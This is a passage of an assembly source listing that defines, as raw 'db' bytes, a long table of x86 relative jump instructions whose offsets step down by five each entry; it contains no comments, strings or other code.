    db 5Bh,8Eh,00h,00h,0E9h,56h,8Eh,00h,00h,0E9h,51h,8Eh,00h,00h,0E9h,4Ch
    db 8Eh,00h,00h,0E9h,47h,8Eh,00h,00h,0E9h,42h,8Eh,00h,00h,0E9h,3Dh,8Eh
    db 00h,00h,0E9h,38h,8Eh,00h,00h,0E9h,33h,8Eh,00h,00h,0E9h,2Eh,8Eh,00h
    db 00h,0E9h,29h,8Eh,00h,00h,0E9h,24h,8Eh,00h,00h,0E9h,1Fh,8Eh,00h,00h
    db 0E9h,1Ah,8Eh,00h,00h,0E9h,15h,8Eh,00h,00h,0E9h,10h,8Eh,00h,00h,0E9h
    db 0Bh,8Eh,00h,00h,0E9h,06h,8Eh,00h,00h,0E9h,01h,8Eh,00h,00h,0E9h,0FCh
    db 8Dh,00h,00h,0E9h,0F7h,8Dh,00h,00h,0E9h,0F2h,8Dh,00h,00h,0E9h,0EDh,8Dh
    db 00h,00h,0E9h,0E8h,8Dh,00h,00h,0E9h,0E3h,8Dh,00h,00h,0E9h,0DEh,8Dh,00h
    db 00h,0E9h,0D9h,8Dh,00h,00h,0E9h,0D4h,8Dh,00h,00h,0E9h,0CFh,8Dh,00h,00h
    db 0E9h,0CAh,8Dh,00h,00h,0E9h,0C5h,8Dh,00h,00h,0E9h,0C0h,8Dh,00h,00h,0E9h
    db 0BBh,8Dh,00h,00h,0E9h,0B6h,8Dh,00h,00h,0E9h,0B1h,8Dh,00h,00h,0E9h,0ACh
    db 8Dh,00h,00h,0E9h,0A7h,8Dh,00h,00h,0E9h,0A2h,8Dh,00h,00h,0E9h,9Dh,8Dh
    db 00h,00h,0E9h,98h,8Dh,00h,00h,0E9h,93h,8Dh,00h,00h,0E9h,8Eh,8Dh,00h
    db 00h,0E9h,89h,8Dh,00h,00h,0E9h,84h,8Dh,00h,00h,0E9h,7Fh,8Dh,00h,00h
    db 0E9h,7Ah,8Dh,00h,00h,0E9h,75h,8Dh,00h,00h,0E9h,70h,8Dh,00h,00h,0E9h
    db 6Bh,8Dh,00h,00h,0E9h,66h,8Dh,00h,00h,0E9h,61h,8Dh,00h,00h,0E9h,5Ch
    db 8Dh,00h,00h,0E9h,57h,8Dh,00h,00h,0E9h,52h,8Dh,00h,00h,0E9h,4Dh,8Dh
    db 00h,00h,0E9h,48h,8Dh,00h,00h,0E9h,43h,8Dh,00h,00h,0E9h,3Eh,8Dh,00h
    db 00h,0E9h,39h,8Dh,00h,00h,0E9h,34h,8Dh,00h,00h,0E9h,2Fh,8Dh,00h,00h
    db 0E9h,2Ah,8Dh,00h,00h,0E9h,25h,8Dh,00h,00h,0E9h,20h,8Dh,00h,00h,0E9h
    db 1Bh,8Dh,00h,00h,0E9h,16h,8Dh,00h,00h,0E9h,11h,8Dh,00h,00h,0E9h,0Ch
    db 8Dh,00h,00h,0E9h,07h,8Dh,00h,00h,0E9h,02h,8Dh,00h,00h,0E9h,0FDh,8Ch
    db 00h,00h,0E9h,0F8h,8Ch,00h,00h,0E9h,0F3h,8Ch,00h,00h,0E9h,0EEh,8Ch,00h
    db 00h,0E9h,0E9h,8Ch,00h,00h,0E9h,0E4h,8Ch,00h,00h,0E9h,0DFh,8Ch,00h,00h
    db 0E9h,0DAh,8Ch,00h,00h,0E9h,0D5h,8Ch,00h,00h,0E9h,0D0h,8Ch,00h,00h,0E9h
    db 0CBh,8Ch,00h,00h,0E9h,0C6h,8Ch,00h,00h,0E9h,0C1h,8Ch,00h,00h,0E9h,0BCh
    db 8Ch,00h,00h,0E9h,0B7h,8Ch,00h,00h,0E9h,0B2h,8Ch,00h,00h,0E9h,0ADh,8Ch
    db 00h,00h,0E9h,0A8h,8Ch,00h,00h,0E9h,0A3h,8Ch,00h,00h,0E9h,9Eh,8Ch,00h
    db 00h,0E9h,99h,8Ch,00h,00h,0E9h,94h,8Ch,00h,00h,0E9h,8Fh,8Ch,00h,00h
    db 0E9h,8Ah,8Ch,00h,00h,0E9h,85h,8Ch,00h,00h,0E9h,80h,8Ch,00h,00h,0E9h
    db 7Bh,8Ch,00h,00h,0E9h,76h,8Ch,00h,00h,0E9h,71h,8Ch,00h,00h,0E9h,6Ch
    db 8Ch,00h,00h,0E9h,67h,8Ch,00h,00h,0E9h,62h,8Ch,00h,00h,0E9h,5Dh,8Ch
    db 00h,00h,0E9h,58h,8Ch,00h,00h,0E9h,53h,8Ch,00h,00h,0E9h,4Eh,8Ch,00h
    db 00h,0E9h,49h,8Ch,00h,00h,0E9h,44h,8Ch,00h,00h,0E9h,3Fh,8Ch,00h,00h
    db 0E9h,3Ah,8Ch,00h,00h,0E9h,35h,8Ch,00h,00h,0E9h,30h,8Ch,00h,00h,0E9h
    db 2Bh,8Ch,00h,00h,0E9h,26h,8Ch,00h,00h,0E9h,21h,8Ch,00h,00h,0E9h,1Ch
    db 8Ch,00h,00h,0E9h,17h,8Ch,00h,00h,0E9h,12h,8Ch,00h,00h,0E9h,0Dh,8Ch
    db 00h,00h,0E9h,08h,8Ch,00h,00h,0E9h,03h,8Ch,00h,00h,0E9h,0FEh,8Bh,00h
    db 00h,0E9h,0F9h,8Bh,00h,00h,0E9h,0F4h,8Bh,00h,00h,0E9h,0EFh,8Bh,00h,00h
    db 0E9h,0EAh,8Bh,00h,00h,0E9h,0E5h,8Bh,00h,00h,0E9h,0E0h,8Bh,00h,00h,0E9h
    db 0DBh,8Bh,00h,00h,0E9h,0D6h,8Bh,00h,00h,0E9h,0D1h,8Bh,00h,00h,0E9h,0CCh
    db 8Bh,00h,00h,0E9h,0C7h,8Bh,00h,00h,0E9h,0C2h,8Bh,00h,00h,0E9h,0BDh,8Bh
    db 00h,00h,0E9h,0B8h,8Bh,00h,00h,0E9h,0B3h,8Bh,00h,00h,0E9h,0AEh,8Bh,00h
    db 00h,0E9h,0A9h,8Bh,00h,00h,0E9h,0A4h,8Bh,00h,00h,0E9h,9Fh,8Bh,00h,00h
    db 0E9h,9Ah,8Bh,00h,00h,0E9h,95h,8Bh,00h,00h,0E9h,90h,8Bh,00h,00h,0E9h
    db 8Bh,8Bh,00h,00h,0E9h,86h,8Bh,00h,00h,0E9h,81h,8Bh,00h,00h,0E9h,7Ch
    db 8Bh,00h,00h,0E9h,77h,8Bh,00h,00h,0E9h,72h,8Bh,00h,00h,0E9h,6Dh,8Bh
    db 00h,00h,0E9h,68h,8Bh,00h,00h,0E9h,63h,8Bh,00h,00h,0E9h,5Eh,8Bh,00h
    db 00h,0E9h,59h,8Bh,00h,00h,0E9h,54h,8Bh,00h,00h,0E9h,4Fh,8Bh,00h,00h
    db 0E9h,4Ah,8Bh,00h,00h,0E9h,45h,8Bh,00h,00h,0E9h,40h,8Bh,00h,00h,0E9h
    db 3Bh,8Bh,00h,00h,0E9h,36h,8Bh,00h,00h,0E9h,31h,8Bh,00h,00h,0E9h,2Ch
    db 8Bh,00h,00h,0E9h,27h,8Bh,00h,00h,0E9h,22h,8Bh,00h,00h,0E9h,1Dh,8Bh
    db 00h,00h,0E9h,18h,8Bh,00h,00h,0E9h,13h,8Bh,00h,00h,0E9h,0Eh,8Bh,00h
    db 00h,0E9h,09h,8Bh,00h,00h,0E9h,04h,8Bh,00h,00h,0E9h,0FFh,8Ah,00h,00h
    db 0E9h,0FAh,8Ah,00h,00h,0E9h,0F5h,8Ah,00h,00h,0E9h,0F0h,8Ah,00h,00h,0E9h
    db 0EBh,8Ah,00h,00h,0E9h,0E6h,8Ah,00h,00h,0E9h,0E1h,8Ah,00h,00h,0E9h,0DCh
    db 8Ah,00h,00h,0E9h,0D7h,8Ah,00h,00h,0E9h,0D2h,8Ah,00h,00h,0E9h,0CDh,8Ah
    db 00h,00h,0E9h,0C8h,8Ah,00h,00h,0E9h,0C3h,8Ah,00h,00h,0E9h,0BEh,8Ah,00h
    db 00h,0E9h,0B9h,8Ah,00h,00h,0E9h,0B4h,8Ah,00h,00h,0E9h,0AFh,8Ah,00h,00h
    db 0E9h,0AAh,8Ah,00h,00h,0E9h,0A5h,8Ah,00h,00h,0E9h,0A0h,8Ah,00h,00h,0E9h
    db 9Bh,8Ah,00h,00h,0E9h,96h,8Ah,00h,00h,0E9h,91h,8Ah,00h,00h,0E9h,8Ch
    db 8Ah,00h,00h,0E9h,87h,8Ah,00h,00h,0E9h,82h,8Ah,00h,00h,0E9h,7Dh,8Ah
    db 00h,00h,0E9h,78h,8Ah,00h,00h,0E9h,73h,8Ah,00h,00h,0E9h,6Eh,8Ah,00h
    db 00h,0E9h,69h,8Ah,00h,00h,0E9h,64h,8Ah,00h,00h,0E9h,5Fh,8Ah,00h,00h
    db 0E9h,5Ah,8Ah,00h,00h,0E9h,55h,8Ah,00h,00h,0E9h,50h,8Ah,00h,00h,0E9h
    db 4Bh,8Ah,00h,00h,0E9h,46h,8Ah,00h,00h,0E9h,41h,8Ah,00h,00h,0E9h,3Ch
    db 8Ah,00h,00h,0E9h,37h,8Ah,00h,00h,0E9h,32h,8Ah,00h,00h,0E9h,2Dh,8Ah
    db 00h,00h,0E9h,28h,8Ah,00h,00h,0E9h,23h,8Ah,00h,00h,0E9h,1Eh,8Ah,00h
    db 00h,0E9h,19h,8Ah,00h,00h,0E9h,14h,8Ah,00h,00h,0E9h,0Fh,8Ah,00h,00h
    db 0E9h,0Ah,8Ah,00h,00h,0E9h,05h,8Ah,00h,00h,0E9h,00h,8Ah,00h,00h,0E9h
    db 0FBh,89h,00h,00h,0E9h,0F6h,89h,00h,00h,0E9h,0F1h,89h,00h,00h,0E9h,0ECh
    db 89h,00h,00h,0E9h,0E7h,89h,00h,00h,0E9h,0E2h,89h,00h,00h,0E9h,0DDh,89h
    db 00h,00h,0E9h,0D8h,89h,00h,00h,0E9h,0D3h,89h,00h,00h,0E9h,0CEh,89h,00h
    db 00h,0E9h,0C9h,89h,00h,00h,0E9h,0C4h,89h,00h,00h,0E9h,0BFh,89h,00h,00h
    db 0E9h,0BAh,89h,00h,00h,0E9h,0B5h,89h,00h,00h,0E9h,0B0h,89h,00h,00h,0E9h
    db 0ABh,89h,00h,00h,0E9h,0A6h,89h,00h,00h,0E9h,0A1h,89h,00h,00h,0E9h,9Ch
    db 89h,00h,00h,0E9h,97h,89h,00h,00h,0E9h,92h,89h,00h,00h,0E9h,8Dh,89h
    db 00h,00h,0E9h,88h,89h,00h,00h,0E9h,83h,89h,00h,00h,0E9h,7Eh,89h,00h
    db 00h,0E9h,79h,89h,00h,00h,0E9h,74h,89h,00h,00h,0E9h,6Fh,89h,00h,00h
    db 0E9h,6Ah,89h,00h,00h,0E9h,65h,89h,00h,00h,0E9h,60h,89h,00h,00h,0E9h
    db 5Bh,89h,00h,00h,0E9h,56h,89h,00h,00h,0E9h,51h,89h,00h,00h,0E9h,4Ch
    db 89h,00h,00h,0E9h,47h,89h,00h,00h,0E9h,42h,89h,00h,00h,0E9h,3Dh,89h
    db 00h,00h,0E9h,38h,89h,00h,00h,0E9h,33h,89h,00h,00h,0E9h,2Eh,89h,00h
    db 00h,0E9h,29h,89h,00h,00h,0E9h,24h,89h,00h,00h,0E9h,1Fh,89h,00h,00h
    db 0E9h,1Ah,89h,00h,00h,0E9h,15h,89h,00h,00h,0E9h,10h,89h,00h,00h,0E9h
    db 0Bh,89h,00h,00h,0E9h,06h,89h,00h,00h,0E9h,01h,89h,00h,00h,0E9h,0FCh
    db 88h,00h,00h,0E9h,0F7h,88h,00h,00h,0E9h,0F2h,88h,00h,00h,0E9h,0EDh,88h
    db 00h,00h,0E9h,0E8h,88h,00h,00h,0E9h,0E3h,88h,00h,00h,0E9h,0DEh,88h,00h
    db 00h,0E9h,0D9h,88h,00h,00h,0E9h,0D4h,88h,00h,00h,0E9h,0CFh,88h,00h,00h
    db 0E9h,0CAh,88h,00h,00h,0E9h,0C5h,88h,00h,00h,0E9h,0C0h,88h,00h,00h,0E9h
    db 0BBh,88h,00h,00h,0E9h,0B6h,88h,00h,00h,0E9h,0B1h,88h,00h,00h,0E9h,0ACh
    db 88h,00h,00h,0E9h,0A7h,88h,00h,00h,0E9h,0A2h,88h,00h,00h,0E9h,9Dh,88h
    db 00h,00h,0E9h,98h,88h,00h,00h,0E9h,93h,88h,00h,00h,0E9h,8Eh,88h,00h
    db 00h,0E9h,89h,88h,00h,00h,0E9h,84h,88h,00h,00h,0E9h,7Fh,88h,00h,00h
    db 0E9h,7Ah,88h,00h,00h,0E9h,75h,88h,00h,00h,0E9h,70h,88h,00h,00h,0E9h
    db 6Bh,88h,00h,00h,0E9h,66h,88h,00h,00h,0E9h,61h,88h,00h,00h,0E9h,5Ch
    db 88h,00h,00h,0E9h,57h,88h,00h,00h,0E9h,52h,88h,00h,00h,0E9h,4Dh,88h
    db 00h,00h,0E9h,48h,88h,00h,00h,0E9h,43h,88h,00h,00h,0E9h,3Eh,88h,00h
    db 00h,0E9h,39h,88h,00h,00h,0E9h,34h,88h,00h,00h,0E9h,2Fh,88h,00h,00h
    db 0E9h,2Ah,88h,00h,00h,0E9h,25h,88h,00h,00h,0E9h,20h,88h,00h,00h,0E9h
    db 1Bh,88h,00h,00h,0E9h,16h,88h,00h,00h,0E9h,11h,88h,00h,00h,0E9h,0Ch
    db 88h,00h,00h,0E9h,07h,88h,00h,00h,0E9h,02h,88h,00h,00h,0E9h,0FDh,87h
    db 00h,00h,0E9h,0F8h,87h,00h,00h,0E9h,0F3h,87h,00h,00h,0E9h,0EEh,87h,00h
    db 00h,0E9h,0E9h,87h,00h,00h,0E9h,0E4h,87h,00h,00h,0E9h,0DFh,87h,00h,00h
    db 0E9h,0DAh,87h,00h,00h,0E9h,0D5h,87h,00h,00h,0E9h,0D0h,87h,00h,00h,0E9h
    db 0CBh,87h,00h,00h,0E9h,0C6h,87h,00h,00h,0E9h,0C1h,87h,00h,00h,0E9h,0BCh
    db 87h,00h,00h,0E9h,0B7h,87h,00h,00h,0E9h,0B2h,87h,00h,00h,0E9h,0ADh,87h
    db 00h,00h,0E9h,0A8h,87h,00h,00h,0E9h,0A3h,87h,00h,00h,0E9h,9Eh,87h,00h
    db 00h,0E9h,99h,87h,00h,00h,0E9h,94h,87h,00h,00h,0E9h,8Fh,87h,00h,00h
    db 0E9h,8Ah,87h,00h,00h,0E9h,85h,87h,00h,00h,0E9h,80h,87h,00h,00h,0E9h
    db 7Bh,87h,00h,00h,0E9h,76h,87h,00h,00h,0E9h,71h,87h,00h,00h,0E9h,6Ch
    db 87h,00h,00h,0E9h,67h,87h,00h,00h,0E9h,62h,87h,00h,00h,0E9h,5Dh,87h
    db 00h,00h,0E9h,58h,87h,00h,00h,0E9h,53h,87h,00h,00h,0E9h,4Eh,87h,00h
    db 00h,0E9h,49h,87h,00h,00h,0E9h,44h,87h,00h,00h,0E9h,3Fh,87h,00h,00h
    db 0E9h,3Ah,87h,00h,00h,0E9h,35h,87h,00h,00h,0E9h,30h,87h,00h,00h,0E9h
    db 2Bh,87h,00h,00h,0E9h,26h,87h,00h,00h,0E9h,21h,87h,00h,00h,0E9h,1Ch
    db 87h,00h,00h,0E9h,17h,87h,00h,00h,0E9h,12h,87h,00h,00h,0E9h,0Dh,87h
    db 00h,00h,0E9h,08h,87h,00h,00h,0E9h,03h,87h,00h,00h,0E9h,0FEh,86h,00h
    db 00h,0E9h,0F9h,86h,00h,00h,0E9h,0F4h,86h,00h,00h,0E9h,0EFh,86h,00h,00h
    db 0E9h,0EAh,86h,00h,00h,0E9h,0E5h,86h,00h,00h,0E9h,0E0h,86h,00h,00h,0E9h
    db 0DBh,86h,00h,00h,0E9h,0D6h,86h,00h,00h,0E9h,0D1h,86h,00h,00h,0E9h,0CCh
    db 86h,00h,00h,0E9h,0C7h,86h,00h,00h,0E9h,0C2h,86h,00h,00h,0E9h,0BDh,86h
    db 00h,00h,0E9h,0B8h,86h,00h,00h,0E9h,0B3h,86h,00h,00h,0E9h,0AEh,86h,00h
    db 00h,0E9h,0A9h,86h,00h,00h,0E9h,0A4h,86h,00h,00h,0E9h,9Fh,86h,00h,00h
    db 0E9h,9Ah,86h,00h,00h,0E9h,95h,86h,00h,00h,0E9h,90h,86h,00h,00h,0E9h
    db 8Bh,86h,00h,00h,0E9h,86h,86h,00h,00h,0E9h,81h,86h,00h,00h,0E9h,7Ch
    db 86h,00h,00h,0E9h,77h,86h,00h,00h,0E9h,72h,86h,00h,00h,0E9h,6Dh,86h
    db 00h,00h,0E9h,68h,86h,00h,00h,0E9h,63h,86h,00h,00h,0E9h,5Eh,86h,00h
    db 00h,0E9h,59h,86h,00h,00h,0E9h,54h,86h,00h,00h,0E9h,4Fh,86h,00h,00h
    db 0E9h,4Ah,86h,00h,00h,0E9h,45h,86h,00h,00h,0E9h,40h,86h,00h,00h,0E9h
    db 3Bh,86h,00h,00h,0E9h,36h,86h,00h,00h,0E9h,31h,86h,00h,00h,0E9h,2Ch
    db 86h,00h,00h,0E9h,27h,86h,00h,00h,0E9h,22h,86h,00h,00h,0E9h,1Dh,86h
    db 00h,00h,0E9h,18h,86h,00h,00h,0E9h,13h,86h,00h,00h,0E9h,0Eh,86h,00h
    db 00h,0E9h,09h,86h,00h,00h,0E9h,04h,86h,00h,00h,0E9h,0FFh,85h,00h,00h
    db 0E9h,0FAh,85h,00h,00h,0E9h,0F5h,85h,00h,00h,0E9h,0F0h,85h,00h,00h,0E9h
    db 0EBh,85h,00h,00h,0E9h,0E6h,85h,00h,00h,0E9h,0E1h,85h,00h,00h,0E9h,0DCh
    db 85h,00h,00h,0E9h,0D7h,85h,00h,00h,0E9h,0D2h,85h,00h,00h,0E9h,0CDh,85h
    db 00h,00h,0E9h,0C8h,85h,00h,00h,0E9h,0C3h,85h,00h,00h,0E9h,0BEh,85h,00h
    db 00h,0E9h,0B9h,85h,00h,00h,0E9h,0B4h,85h,00h,00h,0E9h,0AFh,85h,00h,00h
    db 0E9h,0AAh,85h,00h,00h,0E9h,0A5h,85h,00h,00h,0E9h,0A0h,85h,00h,00h,0E9h
    db 9Bh,85h,00h,00h,0E9h,96h,85h,00h,00h,0E9h,91h,85h,00h,00h,0E9h,8Ch
    db 85h,00h,00h,0E9h,87h,85h,00h,00h,0E9h,82h,85h,00h,00h,0E9h,7Dh,85h
    db 00h,00h,0E9h,78h,85h,00h,00h,0E9h,73h,85h,00h,00h,0E9h,6Eh,85h,00h
    db 00h,0E9h,69h,85h,00h,00h,0E9h,64h,85h,00h,00h,0E9h,5Fh,85h,00h,00h
    db 0E9h,5Ah,85h,00h,00h,0E9h,55h,85h,00h,00h,0E9h,50h,85h,00h,00h,0E9h
    db 4Bh,85h,00h,00h,0E9h,46h,85h,00h,00h,0E9h,41h,85h,00h,00h,0E9h,3Ch
    db 85h,00h,00h,0E9h,37h,85h,00h,00h,0E9h,32h,85h,00h,00h,0E9h,2Dh,85h
    db 00h,00h,0E9h,28h,85h,00h,00h,0E9h,23h,85h,00h,00h,0E9h,1Eh,85h,00h
    db 00h,0E9h,19h,85h,00h,00h,0E9h,14h,85h,00h,00h,0E9h,0Fh,85h,00h,00h
    db 0E9h,0Ah,85h,00h,00h,0E9h,05h,85h,00h,00h,0E9h,00h,85h,00h,00h,0E9h
    db 0FBh,84h,00h,00h,0E9h,0F6h,84h,00h,00h,0E9h,0F1h,84h,00h,00h,0E9h,0ECh
    db 84h,00h,00h,0E9h,0E7h,84h,00h,00h,0E9h,0E2h,84h,00h,00h,0E9h,0DDh,84h
    db 00h,00h,0E9h,0D8h,84h,00h,00h,0E9h,0D3h,84h,00h,00h,0E9h,0CEh,84h,00h
    db 00h,0E9h,0C9h,84h,00h,00h,0E9h,0C4h,84h,00h,00h,0E9h,0BFh,84h,00h,00h
    db 0E9h,0BAh,84h,00h,00h,0E9h,0B5h,84h,00h,00h,0E9h,0B0h,84h,00h,00h,0E9h
    db 0ABh,84h,00h,00h,0E9h,0A6h,84h,00h,00h,0E9h,0A1h,84h,00h,00h,0E9h,9Ch
    db 84h,00h,00h,0E9h,97h,84h,00h,00h,0E9h,92h,84h,00h,00h,0E9h,8Dh,84h
    db 00h,00h,0E9h,88h,84h,00h,00h,0E9h,83h,84h,00h,00h,0E9h,7Eh,84h,00h
    db 00h,0E9h,79h,84h,00h,00h,0E9h,74h,84h,00h,00h,0E9h,6Fh,84h,00h,00h
    db 0E9h,6Ah,84h,00h,00h,0E9h,65h,84h,00h,00h,0E9h,60h,84h,00h,00h,0E9h
    db 5Bh,84h,00h,00h,0E9h,56h,84h,00h,00h,0E9h,51h,84h,00h,00h,0E9h,4Ch
    db 84h,00h,00h,0E9h,47h,84h,00h,00h,0E9h,42h,84h,00h,00h,0E9h,3Dh,84h
    db 00h,00h,0E9h,38h,84h,00h,00h,0E9h,33h,84h,00h,00h,0E9h,2Eh,84h,00h
    db 00h,0E9h,29h,84h,00h,00h,0E9h,24h,84h,00h,00h,0E9h,1Fh,84h,00h,00h
    db 0E9h,1Ah,84h,00h,00h,0E9h,15h,84h,00h,00h,0E9h,10h,84h,00h,00h,0E9h
    db 0Bh,84h,00h,00h,0E9h,06h,84h,00h,00h,0E9h,01h,84h,00h,00h,0E9h,0FCh
    db 83h,00h,00h,0E9h,0F7h,83h,00h,00h,0E9h,0F2h,83h,00h,00h,0E9h,0EDh,83h
    db 00h,00h,0E9h,0E8h,83h,00h,00h,0E9h,0E3h,83h,00h,00h,0E9h,0DEh,83h,00h
    db 00h,0E9h,0D9h,83h,00h,00h,0E9h,0D4h,83h,00h,00h,0E9h,0CFh,83h,00h,00h
    db 0E9h,0CAh,83h,00h,00h,0E9h,0C5h,83h,00h,00h,0E9h,0C0h,83h,00h,00h,0E9h
    db 0BBh,83h,00h,00h,0E9h,0B6h,83h,00h,00h,0E9h,0B1h,83h,00h,00h,0E9h,0ACh
    db 83h,00h,00h,0E9h,0A7h,83h,00h,00h,0E9h,0A2h,83h,00h,00h,0E9h,9Dh,83h
    db 00h,00h,0E9h,98h,83h,00h,00h,0E9h,93h,83h,00h,00h,0E9h,8Eh,83h,00h
    db 00h,0E9h,89h,83h,00h,00h,0E9h,84h,83h,00h,00h,0E9h,7Fh,83h,00h,00h
    db 0E9h,7Ah,83h,00h,00h,0E9h,75h,83h,00h,00h,0E9h,70h,83h,00h,00h,0E9h
    db 6Bh,83h,00h,00h,0E9h,66h,83h,00h,00h,0E9h,61h,83h,00h,00h,0E9h,5Ch
    db 83h,00h,00h,0E9h,57h,83h,00h,00h,0E9h,52h,83h,00h,00h,0E9h,4Dh,83h
    db 00h,00h,0E9h,48h,83h,00h,00h,0E9h,43h,83h,00h,00h,0E9h,3Eh,83h,00h
    db 00h,0E9h,39h,83h,00h,00h,0E9h,34h,83h,00h,00h,0E9h,2Fh,83h,00h,00h
    db 0E9h,2Ah,83h,00h,00h,0E9h,25h,83h,00h,00h,0E9h,20h,83h,00h,00h,0E9h
    db 1Bh,83h,00h,00h,0E9h,16h,83h,00h,00h,0E9h,11h,83h,00h,00h,0E9h,0Ch
    db 83h,00h,00h,0E9h,07h,83h,00h,00h,0E9h,02h,83h,00h,00h,0E9h,0FDh,82h
    db 00h,00h,0E9h,0F8h,82h,00h,00h,0E9h,0F3h,82h,00h,00h,0E9h,0EEh,82h,00h
    db 00h,0E9h,0E9h,82h,00h,00h,0E9h,0E4h,82h,00h,00h,0E9h,0DFh,82h,00h,00h
    db 0E9h,0DAh,82h,00h,00h,0E9h,0D5h,82h,00h,00h,0E9h,0D0h,82h,00h,00h,0E9h
    db 0CBh,82h,00h,00h,0E9h,0C6h,82h,00h,00h,0E9h,0C1h,82h,00h,00h,0E9h,0BCh
    db 82h,00h,00h,0E9h,0B7h,82h,00h,00h,0E9h,0B2h,82h,00h,00h,0E9h,0ADh,82h
    db 00h,00h,0E9h,0A8h,82h,00h,00h,0E9h,0A3h,82h,00h,00h,0E9h,9Eh,82h,00h
    db 00h,0E9h,99h,82h,00h,00h,0E9h,94h,82h,00h,00h,0E9h,8Fh,82h,00h,00h
    db 0E9h,8Ah,82h,00h,00h,0E9h,85h,82h,00h,00h,0E9h,80h,82h,00h,00h,0E9h
    db 7Bh,82h,00h,00h,0E9h,76h,82h,00h,00h,0E9h,71h,82h,00h,00h,0E9h,6Ch
    db 82h,00h,00h,0E9h,67h,82h,00h,00h,0E9h,62h,82h,00h,00h,0E9h,5Dh,82h
    db 00h,00h,0E9h,58h,82h,00h,00h,0E9h,53h,82h,00h,00h,0E9h,4Eh,82h,00h
    db 00h,0E9h,49h,82h,00h,00h,0E9h,44h,82h,00h,00h,0E9h,3Fh,82h,00h,00h
    db 0E9h,3Ah,82h,00h,00h,0E9h,35h,82h,00h,00h,0E9h,30h,82h,00h,00h,0E9h
    db 2Bh,82h,00h,00h,0E9h,26h,82h,00h,00h,0E9h,21h,82h,00h,00h,0E9h,1Ch
    db 82h,00h,00h,0E9h,17h,82h,00h,00h,0E9h,12h,82h,00h,00h,0E9h,0Dh,82h
    db 00h,00h,0E9h,08h,82h,00h,00h,0E9h,03h,82h,00h,00h,0E9h,0FEh,81h,00h
    db 00h,0E9h,0F9h,81h,00h,00h,0E9h,0F4h,81h,00h,00h,0E9h,0EFh,81h,00h,00h
    db 0E9h,0EAh,81h,00h,00h,0E9h,0E5h,81h,00h,00h,0E9h,0E0h,81h,00h,00h,0E9h
    db 0DBh,81h,00h,00h,0E9h,0D6h,81h,00h,00h,0E9h,0D1h,81h,00h,00h,0E9h,0CCh
    db 81h,00h,00h,0E9h,0C7h,81h,00h,00h,0E9h,0C2h,81h,00h,00h,0E9h,0BDh,81h
    db 00h,00h,0E9h,0B8h,81h,00h,00h,0E9h,0B3h,81h,00h,00h,0E9h,0AEh,81h,00h
    db 00h,0E9h,0A9h,81h,00h,00h,0E9h,0A4h,81h,00h,00h,0E9h,9Fh,81h,00h,00h
    db 0E9h,9Ah,81h,00h,00h,0E9h,95h,81h,00h,00h,0E9h,90h,81h,00h,00h,0E9h
    db 8Bh,81h,00h,00h,0E9h,86h,81h,00h,00h,0E9h,81h,81h,00h,00h,0E9h,7Ch
    db 81h,00h,00h,0E9h,77h,81h,00h,00h,0E9h,72h,81h,00h,00h,0E9h,6Dh,81h
    db 00h,00h,0E9h,68h,81h,00h,00h,0E9h,63h,81h,00h,00h,0E9h,5Eh,81h,00h
    db 00h,0E9h,59h,81h,00h,00h,0E9h,54h,81h,00h,00h,0E9h,4Fh,81h,00h,00h
    db 0E9h,4Ah,81h,00h,00h,0E9h,45h,81h,00h,00h,0E9h,40h,81h,00h,00h,0E9h
    db 3Bh,81h,00h,00h,0E9h,36h,81h,00h,00h,0E9h,31h,81h,00h,00h,0E9h,2Ch
    db 81h,00h,00h,0E9h,27h,81h,00h,00h,0E9h,22h,81h,00h,00h,0E9h,1Dh,81h
    db 00h,00h,0E9h,18h,81h,00h,00h,0E9h,13h,81h,00h,00h,0E9h,0Eh,81h,00h
    db 00h,0E9h,09h,81h,00h,00h,0E9h,04h,81h,00h,00h,0E9h,0FFh,80h,00h,00h
    db 0E9h,0FAh,80h,00h,00h,0E9h,0F5h,80h,00h,00h,0E9h,0F0h,80h,00h,00h,0E9h
    db 0EBh,80h,00h,00h,0E9h,0E6h,80h,00h,00h,0E9h,0E1h,80h,00h,00h,0E9h,0DCh
    db 80h,00h,00h,0E9h,0D7h,80h,00h,00h,0E9h,0D2h,80h,00h,00h,0E9h,0CDh,80h
    db 00h,00h,0E9h,0C8h,80h,00h,00h,0E9h,0C3h,80h,00h,00h,0E9h,0BEh,80h,00h
    db 00h,0E9h,0B9h,80h,00h,00h,0E9h,0B4h,80h,00h,00h,0E9h,0AFh,80h,00h,00h
    db 0E9h,0AAh,80h,00h,00h,0E9h,0A5h,80h,00h,00h,0E9h,0A0h,80h,00h,00h,0E9h
    db 9Bh,80h,00h,00h,0E9h,96h,80h,00h,00h,0E9h,91h,80h,00h,00h,0E9h,8Ch
    db 80h,00h,00h,0E9h,87h,80h,00h,00h,0E9h,82h,80h,00h,00h,0E9h,7Dh,80h
    db 00h,00h,0E9h,78h,80h,00h,00h,0E9h,73h,80h,00h,00h,0E9h,6Eh,80h,00h
    db 00h,0E9h,69h,80h,00h,00h,0E9h,64h,80h,00h,00h,0E9h,5Fh,80h,00h,00h
    db 0E9h,5Ah,80h,00h,00h,0E9h,55h,80h,00h,00h,0E9h,50h,80h,00h,00h,0E9h
    db 4Bh,80h,00h,00h,0E9h,46h,80h,00h,00h,0E9h,41h,80h,00h,00h,0E9h,3Ch
    db 80h,00h,00h,0E9h,37h,80h,00h,00h,0E9h,32h,80h,00h,00h,0E9h,2Dh,80h
    db 00h,00h,0E9h,28h,80h,00h,00h,0E9h,23h,80h,00h,00h,0E9h,1Eh,80h,00h
    db 00h,0E9h,19h,80h,00h,00h,0E9h,14h,80h,00h,00h,0E9h,0Fh,80h,00h,00h
    db 0E9h,0Ah,80h,00h,00h,0E9h,05h,80h,00h,00h,0E9h,00h,80h,00h,00h,0E9h
    db 0FBh,7Fh,00h,00h,0E9h,0F6h,7Fh,00h,00h,0E9h,0F1h,7Fh,00h,00h,0E9h,0ECh
    db 7Fh,00h,00h,0E9h,0E7h,7Fh,00h,00h,0E9h,0E2h,7Fh,00h,00h,0E9h,0DDh,7Fh
    db 00h,00h,0E9h,0D8h,7Fh,00h,00h,0E9h,0D3h,7Fh,00h,00h,0E9h,0CEh,7Fh,00h
    db 00h,0E9h,0C9h,7Fh,00h,00h,0E9h,0C4h,7Fh,00h,00h,0E9h,0BFh,7Fh,00h,00h
    db 0E9h,0BAh,7Fh,00h,00h,0E9h,0B5h,7Fh,00h,00h,0E9h,0B0h,7Fh,00h,00h,0E9h
    db 0ABh,7Fh,00h,00h,0E9h,0A6h,7Fh,00h,00h,0E9h,0A1h,7Fh,00h,00h,0E9h,9Ch
